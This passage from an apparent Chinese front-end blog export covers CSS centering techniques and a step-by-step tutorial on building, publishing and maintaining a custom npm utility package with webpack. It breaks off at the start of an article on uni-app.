<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: auto <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="内边距相等"><a href="#内边距相等" class="headerlink" title="内边距相等"></a>内边距相等</h3><p>适用：通用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">5%</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">10%</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="float"><a href="#float" class="headerlink" title="float"></a>float</h3><p>适用：通用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.floater</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: -<span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;floater&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h2><h3 id="text-align"><a href="#text-align" class="headerlink" title="text-align"></a>text-align</h3><p>适用：文本</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center; <span class="comment">/* 继承样式 */</span></span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h3><p>适用：块级元素</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="padding"><a href="#padding" class="headerlink" title="padding"></a>padding</h3><p>适用：通用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">5%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绝对定位搭配"><a href="#绝对定位搭配" class="headerlink" title="绝对定位搭配"></a>绝对定位搭配</h3><p>参考垂直居中绝对定位调试，这里不做赘述。</p>
<h2 id="垂直水平居中"><a href="#垂直水平居中" class="headerlink" title="垂直水平居中"></a>垂直水平居中</h2><p>结合垂直居中和水平居中，这里不做赘述。</p>
<div class="note success"><p>以下方法也可达到垂直水平居中效果：<br>1、绝对定位结合 css3 2D 转换方法 <code>translate(x,y)</code> 负值；<br>2、flex<br>…</p>
</div>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>npm自定义包发布</title>
    <url>/2021/05/07/20210507-npm%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8C%85%E5%8F%91%E5%B8%83/</url>
    <content><![CDATA[<p>本文以自定义工具函数库为例，讲解工具包项目从发布到 npm 中央仓库、维护及使用的过程。</p>
<p><img src="https://cdn.huatree.top/image-20220427185535158.png" alt="image-20220427185535158"></p>
<span id="more"></span>

<h2 id="项目准备"><a href="#项目准备" class="headerlink" title="项目准备"></a>项目准备</h2><p>创建工具包项目</p>
<h3 id="安装-Node-和-Git"><a href="#安装-Node-和-Git" class="headerlink" title="安装 Node 和 Git"></a>安装 Node 和 Git</h3><p>检查是否已经安装 node（node 中自带 npm）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># windows：cmd命令</span></span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure>

<p>如果 node 与 npm 命令不识别，说明你尚未安装 node；或者者未配置环境变量，导致当前路径下无法识别命令。安装 node，自行解决，这里不再赘述。</p>
<p>Git 的安装自行解决</p>
<h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个空的项目文件夹：huatree-utils</span></span><br><span class="line"><span class="comment"># 在文件夹下执行命令</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="comment"># 或者yarn</span></span><br><span class="line">yarn init -y</span><br></pre></td></tr></table></figure>

<p>npm 命令，<a href="https://docs.npmjs.com/cli/v8/commands/npm-init">详见官网</a></p>
<p>yarn 命令，<a href="https://www.yarnpkg.cn/cli/init">详见官网</a></p>
<h3 id="初始化-git-和配置忽略项"><a href="#初始化-git-和配置忽略项" class="headerlink" title="初始化 git 和配置忽略项"></a>初始化 git 和配置忽略项</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>项目根目录下创建<code>.gitignore</code>，配置如下</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">.DS_Store</span></span><br><span class="line"><span class="string">node_modules</span></span><br><span class="line"><span class="string">npm-debug.log*</span></span><br><span class="line"><span class="string">yarn-debug.log*</span></span><br><span class="line"><span class="string">yarn-error.log*</span></span><br><span class="line"><span class="string">**/*.log</span></span><br><span class="line"></span><br><span class="line"><span class="string">bower_components</span></span><br><span class="line"><span class="string">coverage</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Editor directories and files</span></span><br><span class="line"><span class="string">.idea</span></span><br><span class="line"><span class="string">.vscode</span></span><br><span class="line"><span class="string">*.suo</span></span><br><span class="line"><span class="string">*.ntvs*</span></span><br><span class="line"><span class="string">*.njsproj</span></span><br><span class="line"><span class="string">*.sln</span></span><br><span class="line"><span class="string">*.local</span></span><br></pre></td></tr></table></figure>

<h3 id="下载依赖包"><a href="#下载依赖包" class="headerlink" title="下载依赖包"></a>下载依赖包</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i webpack webpack-cli -D</span><br></pre></td></tr></table></figure>

<h3 id="配置-webpack"><a href="#配置-webpack" class="headerlink" title="配置 webpack"></a>配置 webpack</h3><p><code>webpack.config.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 模式</span></span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;development&#x27;</span>, <span class="comment">// 也可以使用压缩方式 production</span></span><br><span class="line">  <span class="comment">// 入口</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">  <span class="comment">// 出口</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="comment">// 打包文件夹</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    <span class="comment">// 打包文件</span></span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&#x27;huatree-utils.js&#x27;</span>,</span><br><span class="line">    <span class="comment">// 向外暴露的对象的名称</span></span><br><span class="line">    <span class="attr">library</span>: <span class="string">&#x27;htUtils&#x27;</span>,</span><br><span class="line">    <span class="comment">// 打包生成库可以通过esm/commonjs/reqirejs的语法引入</span></span><br><span class="line">    <span class="attr">libraryTarget</span>: <span class="string">&#x27;umd&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="在入口-JS-中导出功能"><a href="#在入口-JS-中导出功能" class="headerlink" title="在入口 JS 中导出功能"></a>在入口 JS 中导出功能</h3><p><code>src/index.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;测试自定义包&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test()&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置打包命令"><a href="#配置打包命令" class="headerlink" title="配置打包命令"></a>配置打包命令</h3><p><code>package.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;build:watch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --watch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>项目进行打包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run build:watch</span><br></pre></td></tr></table></figure>

<h3 id="测试使用自定义包"><a href="#测试使用自定义包" class="headerlink" title="测试使用自定义包"></a>测试使用自定义包</h3><p><code>test/first.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../dist/huatree-utils.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    htUtils.test()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.huatree.top/image-20220427172208754.png" alt="image-20220427172208754"></p>
<h2 id="发布流程"><a href="#发布流程" class="headerlink" title="发布流程"></a>发布流程</h2><h3 id="完善-package-json"><a href="#完善-package-json" class="headerlink" title="完善 package.json"></a>完善 package.json</h3><p>name：必须是唯一的名称(在 npm 在线中央仓库中没有同名的)</p>
<p>main：必须指定为打包生成的 js 文件</p>
<p>keywords：指定一些方便别的程序员搜索到当前库的关键字</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ht-utils&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;huatree-自定义工具函数库&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/huatree-utils.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build:watch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --watch&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span> <span class="string">&quot;...&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;repository&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/huatree/ht-utils&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;醉梦&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;webpack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.72.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack-cli&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.9.2&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>!</p>
<p>关联 github、填好作者、协议、项目描述、版本。</p>
<p>注意项目根目录带上 README.md 使用介绍。</p>
</blockquote>
<p>了解package.json文件更多配置信息，<a href="https://docs.npmjs.com/cli/v9/configuring-npm/package-json#main">详见</a></p>
<h3 id="npm-配置"><a href="#npm-配置" class="headerlink" title="npm 配置"></a>npm 配置</h3><p>npm 配置的中央仓库不能是淘宝镜像</p>
<p>发布前必须执行:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org/</span><br></pre></td></tr></table></figure>

<p>不用发布时:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 淘宝镜像url可能有改变，根据实际情况使用url</span></span><br><span class="line">npm config <span class="built_in">set</span> registry http://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>

<p>查看配置:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config list</span><br></pre></td></tr></table></figure>

<h3 id="注册-npm-中央仓库账号"><a href="#注册-npm-中央仓库账号" class="headerlink" title="注册 npm 中央仓库账号"></a>注册 npm 中央仓库账号</h3><p>注册地址，<a href="https://www.npmjs.com/">详见</a></p>
<p>关键信息：用户名、密码、邮箱（需要验证）</p>
<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm adduser</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">npm login</span><br><span class="line"><span class="comment"># 退出登录</span></span><br><span class="line">npm <span class="built_in">logout</span></span><br></pre></td></tr></table></figure>

<p>登录 npm 仓库：依次指定用户名、密码、邮箱</p>
<ul>
<li><p>密码输入过程不可见</p>
</li>
<li><p>下次登录的时候，可能会输入验证码，验证码会通过输入的邮箱发送。</p>
</li>
</ul>
<h3 id="发布仓库"><a href="#发布仓库" class="headerlink" title="发布仓库"></a>发布仓库</h3><p>执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>

<p>如果发布失败，出现 npm 403 错误，一般是库名已存在（重复了），修改 name 为唯一值，再发布。</p>
<h2 id="仓库维护"><a href="#仓库维护" class="headerlink" title="仓库维护"></a>仓库维护</h2><h3 id="更新代码后再发布"><a href="#更新代码后再发布" class="headerlink" title="更新代码后再发布"></a>更新代码后再发布</h3><p>修改项目库的版本号：package.json 中的 version，例如从 1.0.0 改为 1.0.1。</p>
<blockquote>
<p>! 版本号注意一定要变大</p>
</blockquote>
<p>修改代码后重新打包、发布</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm run build</span><br><span class="line"><span class="comment"># 登录情况下执行</span></span><br><span class="line">npm publish</span><br></pre></td></tr></table></figure>

<h3 id="强制删除已发布的库"><a href="#强制删除已发布的库" class="headerlink" title="强制删除已发布的库"></a>强制删除已发布的库</h3><blockquote>
<p>! 72 小时内可删除，超过则无法删除</p>
</blockquote>
<p><strong>登录</strong>情况下执行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm unpublish --force</span><br></pre></td></tr></table></figure>

<h2 id="使用自定义工具包"><a href="#使用自定义工具包" class="headerlink" title="使用自定义工具包"></a>使用自定义工具包</h2><p>下载工具包</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 名称是你前面指定发布的库名(位于package.json中的name参数)</span></span><br><span class="line">npm i huatree-utils</span><br></pre></td></tr></table></figure>

<p>网页中引入并使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./node_modules/ht-utils/dist/huatree-utils.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  htUtils.test()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>模块化引入并使用(ESM 方式)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; test &#125; <span class="keyword">from</span> <span class="string">&#x27;ht-utils&#x27;</span></span><br><span class="line"><span class="title function_">test</span>()</span><br></pre></td></tr></table></figure>

<p>模块化引入并使用(CommonJS 方式)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; test &#125; = <span class="built_in">require</span>(<span class="string">&#x27;ht-utils&#x27;</span>)</span><br><span class="line"><span class="title function_">test</span>()</span><br></pre></td></tr></table></figure>

<h2 id="issues"><a href="#issues" class="headerlink" title="issues"></a>issues</h2><h3 id="引入ht-m-utils报错：ReferenceError-self-is-not-defined"><a href="#引入ht-m-utils报错：ReferenceError-self-is-not-defined" class="headerlink" title="引入ht-m-utils报错：ReferenceError: self is not defined"></a>引入ht-m-utils报错：ReferenceError: self is not defined</h3><p>ht-m-utils项目中，需修改配置webpack.config.js，加入<code>globalObject: &#39;this&#39;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">globalObject</span>: <span class="string">&#x27;this&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://webpack.docschina.org/configuration/output/#outputglobalobject">详见</a></p>
<h3 id="Warning-To-load-an-ES-module-set-“type“-“module“-in-the-package-json-or-use-the-mjs-extension"><a href="#Warning-To-load-an-ES-module-set-“type“-“module“-in-the-package-json-or-use-the-mjs-extension" class="headerlink" title="Warning: To load an ES module, set “type“: “module“ in the package.json or use the .mjs extension"></a>Warning: To load an ES module, set “type“: “module“ in the package.json or use the .mjs extension</h3><p>如果项目中没有配置ES6的ESM转ES5，引入ht-m-utils运行时，会出现这个问题。</p>
<p>解决方案：配置ES6转ES5，或者package.json加入<code>&quot;type&quot;: &quot;module&quot;</code>，以便支持ESM</p>
<p><a href="https://blog.csdn.net/weixin_44505553/article/details/108830616?ydreferer=aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms/dXJsPWJ6czhsRHBEVjJCOGNpTkp3LTAzTVp5dW9ZNkNEaUFhRG9KdzBhTHlMR2tGSW9GNWY2QTlLVGpYVWEtOHBVWFlOM2l1Zmc0YnVBSnZPcWp1a0hQZ3VFYk9EN2xiczcxZjE5VUxMSFVqNmNPJndkPSZlcWlkPWNkMTliNTVlMDBmYzBmZjEwMDAwMDAwMzY0MzJhNWNl">了解更多</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.cnblogs.com/CyLee/p/10563519.html">npm 发布包和删除包（2019 最新攻略）</a></p>
<p>[2] <a href="https://www.bilibili.com/video/BV1hP4y1G7Z6">Web 前端自定义工具函数库</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>搞定uni-app</title>
    <url>/2021/07/01/20210701-%E6%90%9E%E5%AE%9Auni-app/</url>
    <content><![CDATA[<p>官方描述，<code>uni-app</code> 是一个使用 Vue.js 开发所有前端应用的框架，开发者编写一套代码，可发布到 iOS、Android、Web（响应式）、以及各种小程序（微信&#x2F;支付宝&#x2F;百度&#x2F;头条&#x2F;飞书&#x2F;QQ&#x2F;快手&#x2F;钉钉&#x2F;淘宝）、快应用等多个平台。</p>
<p><img src="https://cdn.huatree.top/image-20220428083519310.png" alt="image-20220428083519310"></p>
<span id="more"></span>

<blockquote>
<p>uni-app<a href="https://uniapp.dcloud.net.cn/">详见官网</a></p>
</blockquote>
<h2 id="熟悉-uni-app-框架主要特征"><a href="#熟悉-uni-app-框架主要特征" class="headerlink" title="熟悉 uni-app 框架主要特征"></a>熟悉 uni-app 框架主要特征</h2><p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-a90b5f95-90ba-4d30-a6a7-cd4d057327db/423744c0-5673-4a14-adca-14bd986c3f05.jpg" alt="other-01"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="开发工具选择"><a href="#开发工具选择" class="headerlink" title="开发工具选择"></a>开发工具选择</h3><p>工欲善其事，必先利其器。合适的事用合适的工具。<strong>App 的真机运行、日志显示、云打包只能在 HBuilderX 中使用</strong>。使用其他 ide，如 VSCode，只能做 uni-app 的 h5 和各端小程序开发。</p>
<p>安装编辑器 HbuilderX ，<a href="https://www.dcloud.io/hbuilderx.html">下载地址</a></p>
<p>HBuilderX 是通用的前端开发工具，但为<code>uni-app</code>做了特别强化。下载 App 开发版，可开箱即用。</p>
<p>安装微信开发者工具，<a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">下载地址</a></p>
<h3 id="运行-uni-app"><a href="#运行-uni-app" class="headerlink" title="运行 uni-app"></a>运行 uni-app</h3><p>第一次使用 HBuilder，项目&gt;运行&gt;<strong>运行到小程序模拟器&gt;微信开发者工具</strong>，需要注意 3 点：</p>
<ul>
